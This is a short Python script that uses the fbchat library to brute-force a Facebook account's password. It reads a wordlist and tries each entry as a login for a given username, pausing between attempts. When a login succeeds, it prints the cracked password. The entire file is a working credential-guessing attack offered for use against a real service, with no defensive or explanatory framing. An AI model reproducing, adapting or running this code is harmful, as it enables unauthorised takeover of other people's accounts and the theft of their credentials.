from fbchat import *
from time import sleep
from sys import exit

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange

def facebookBruteforce(username, wordlist, delay):
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            client = Client(str(username), password)
            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            exit()
        except:
             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(delay)
